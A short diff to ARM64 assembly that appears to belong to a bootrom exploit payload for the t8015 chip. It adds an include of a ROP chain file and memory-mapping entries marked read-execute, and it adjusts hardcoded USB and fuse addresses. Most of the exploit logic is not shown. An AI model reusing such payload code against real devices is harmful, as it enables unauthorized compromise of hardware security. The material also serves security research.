@@ -5,11 +5,24 @@
 //  copy of the license can be found in the LICENSE.txt file.
 //
 
+#include "t8015_rop.s"
+
+	.balignl 0x400, 0	// 0x400
+
+	.quad 0x1000006a5	// 0x100000000-0x100020000 R-X
+
+	.balignl 0x200, 0	// 0x600
+
+	.quad 0x60000180000625
+	.quad 0x1800006a5
+
+//------------------------------------------------------------------------------
+
 	.pool
-	.set usb_serial,		0x180003A78
-	.set usb_create_desc_fn,	0x10000AE80
-	.set usb_serial_desc,		0x1800008FA
-	.set cfg_fuse0_raw,		0x2352BC000
+	.set usb_serial,		0x180003a78
+	.set usb_create_desc_fn,	0x10000ae80
+	.set usb_serial_desc,		0x1800008fa
+	.set cfg_fuse0_raw,		0x2352bc000
 
 bootstrap:
 	stp	x29, x30, [sp, #-0x10]!
